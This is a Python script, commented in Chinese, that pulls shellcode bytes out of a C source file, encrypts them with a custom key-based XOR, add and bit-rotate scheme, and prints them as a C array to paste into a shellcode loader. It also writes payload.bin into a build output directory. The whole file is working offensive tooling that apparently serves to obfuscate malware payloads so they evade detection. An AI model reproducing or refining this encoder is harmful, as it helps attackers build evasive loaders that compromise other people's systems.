#!/usr/bin/env python3
import sys
import re
import os
import shutil

def custom_encrypt(data: bytes) -> bytes:
    """一个包含多步变换的私有加密函数"""
    encrypted = bytearray()
    key_stream = b"MyPr1v4t3K3y!"  # 密钥流
    key_len = len(key_stream)
    
    for i, byte in enumerate(data):
        # 变换1: 与密钥流XOR
        byte ^= key_stream[i % key_len]
        # 变换2: 加上当前位置索引（使相同明文字节在不同位置密文不同）
        byte = (byte + i) & 0xFF
        # 变换3: 循环左移，移位量由密钥流决定
        shift = key_stream[i % key_len] % 7 + 1  # 移动1-7位
        byte = ((byte << shift) | (byte >> (8 - shift))) & 0xFF
        # 变换4: 再次XOR（使用变换后的密钥）
        byte ^= (key_stream[i % key_len] ^ 0x55)
        encrypted.append(byte)
    return bytes(encrypted)

def copy_to_output_dir(source_file):
    """拷贝文件到输出目录的相对路径"""
    # 脚本所在目录（generate目录）
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # 构建相对路径：从generate目录到out/bin.x86
    # 假设目录结构：generate/../out/bin.x86
    target_dir = os.path.join(script_dir, "../../../", "out", "bin.x86")
    target_dir = os.path.normpath(target_dir)  # 规范化路径
    
    # 确保目标目录存在
    os.makedirs(target_dir, exist_ok=True)
    
    # 目标文件路径
    target_file = os.path.join(target_dir, os.path.basename(source_file))
    
    try:
        shutil.copy2(source_file, target_file)
        print(f"[✓] 已拷贝文件到: {target_file}")
        return target_file
    except Exception as e:
        print(f"[✗] 拷贝失败: {e}")
        return None


def main():
    if len(sys.argv) != 2:
        print(f"用法: {sys.argv[0]} <shellcode.c>")
        sys.exit(1)
    
    with open(sys.argv[1], 'r') as f:
        content = f.read()
    
    # 从C数组字符串中提取十六进制字节（处理\xfc\xe8...格式）
    hex_bytes = re.findall(r'\\x([0-9a-fA-F]{2})', content)
    if not hex_bytes:
        print("错误: 无法从文件中提取shellcode字节")
        sys.exit(1)
    
    # 转换为字节数组
    original_shellcode = bytes(int(h, 16) for h in hex_bytes)
    print(f"[*] 原始Shellcode长度: {len(original_shellcode)} 字节")
    
    # 执行加密
    encrypted = custom_encrypt(original_shellcode)
    
    # 输出为C数组格式，可直接复制到C++代码中
    print("\n// 私有加密后的Shellcode数组（复制到加载器中）")
    print(f"const unsigned char g_encryptedShellcode[] = {{")
    for i, byte in enumerate(encrypted):
        print(f"0x{byte:02x}, ", end='')
        if (i + 1) % 12 == 0:  # 每行12个字节
            print()
    print("\n};")
    print(f"const SIZE_T g_encryptedShellcodeSize = {len(encrypted)};")
    
    # 可选：保存加密后的二进制文件，用于其他用途
    with open('payload.bin', 'wb') as f:
        f.write(encrypted)
    print("[*] 已保存加密后的二进制文件: payload.bin")
    
    copy_to_output_dir('payload.bin')

if __name__ == "__main__":
    main()